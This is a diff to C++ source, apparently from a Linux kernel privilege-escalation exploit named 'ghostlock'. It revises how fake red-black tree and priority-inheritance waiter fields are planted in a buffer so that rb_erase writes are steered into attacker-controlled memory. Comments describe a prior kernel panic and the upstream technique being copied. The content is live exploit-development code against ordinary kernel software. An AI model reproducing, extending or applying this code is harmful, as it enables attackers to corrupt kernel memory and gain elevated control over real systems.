@@ -44,23 +44,27 @@ namespace ghostlock::route {
     __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
         memset(stamp, 0, sizeof(stamp));
 
-        /* v12.2b: plant the FULL compact image — ghost FIELDS 0..9 (the
-         * mcast carrier reaches the struct base, unlike the fd_set window
-         * which starts at the select route's word 2). Same field sequence
-         * as the select route's table, reindexed from the struct base:
-         * tree_pc, tree_right, tree_left, pi_pc, pi_right, pi_left, task,
-         * lock, prio, deadline. */
+        /* v12.3: plant the FULL compact image with UPSTREAM field semantics.
+         * Fields 0-2 (tree node) = ZERO — upstream slide.c: "tree_pc=0 → the
+         * first rb_erase takes the ROOT path and writes only into the dm
+         * page; a kernel pointer here routes the parent-path writes into
+         * kernel memory and derails the walk" (exactly panic #12: x27 =
+         * 0xaae9535e6fec3320, residue read through a parent chain that left
+         * our page). The write rides the PI node instead: field3/5 =
+         * fake_right/fake_left (the same V/T pair encode_compact_waiter
+         * plants in the W0 node), field6/7 = fake_task/fake_lock,
+         * field8 = prio. */
         const uint64_t prio_word = static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO);
         const struct {
             int32_t field;
             uint64_t value;
         } words[] = {
-                {0, (session::g_exploit_session.heap.current.fake_right)},
+                {0, 0},
                 {1, 0},
-                {2, request->target},
+                {2, 0},
                 {3, (session::g_exploit_session.heap.current.fake_right)},
                 {4, 0},
-                {5, request->target},
+                {5, (session::g_exploit_session.heap.current.fake_left)},
                 {6, (session::g_exploit_session.heap.current.fake_task)},
                 {7, (session::g_exploit_session.heap.current.fake_lock)},
                 {8, prio_word},
